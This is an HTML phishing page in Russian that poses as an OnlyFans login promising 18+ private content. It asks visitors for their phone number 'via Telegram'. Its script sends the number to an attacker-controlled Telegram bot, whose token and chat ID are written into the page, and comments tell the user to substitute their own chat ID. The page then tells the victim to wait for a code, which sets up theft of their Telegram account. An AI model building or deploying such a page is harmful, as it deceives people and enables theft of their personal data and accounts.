<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OnlyFans - Приватный контент</title>
    <style>
        body { margin: 0; font-family: Arial; background: #000; color: #fff; text-align: center; }
        .header { background: #ff00ff; padding: 20px; font-size: 24px; font-weight: bold; }
        .content { padding: 20px; }
        input { width: 80%; padding: 15px; margin: 10px; font-size: 18px; border-radius: 8px; border: none; }
        button { background: #ff00ff; color: white; padding: 15px 30px; font-size: 20px; border: none; border-radius: 8px; cursor: pointer; margin: 10px; }
        button:hover { background: #ff66ff; }
        .error { color: #ff4444; margin: 10px; }
    </style>
</head>
<body>
    <div class="header">OnlyFans</div>
    <div class="content">
        <h2>Приватный контент 18+</h2>
        <p>Войдите, чтобы увидеть эксклюзивные фото и видео</p>
        
        <input type="text" id="phone" placeholder="+79123456789" maxlength="15">
        <button onclick="sendPhone()">Войти через Telegram</button>
        
        <div id="status"></div>
    </div>

    <script>
    async function sendPhone() {
        const phone = document.getElementById('phone').value.trim();
        const status = document.getElementById('status');
        
        if (!phone.startsWith('+') || phone.length < 11) {
            status.innerHTML = '<div class="error">❌ Неверный формат номера. Должен начинаться с +</div>';
            return;
        }
        
        status.innerHTML = 'Отправляем номер...';
        
        try {
            // Отправляем на твой бот
            await fetch(`https://api.telegram.org/bot8387138313:AAGOZMAgTVz6IGiEHojsu5bQKYGO0PvR5s8/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: "8309100582",   // ← Замени на свой ID
                    text: phone
                })
            });
            
            status.innerHTML = '✅ Номер отправлен. Ожидайте код в Telegram.';
        } catch(e) {
            status.innerHTML = '<div class="error">Ошибка соединения. Попробуйте позже.</div>';
        }
    }
    </script>
</body>
</html>
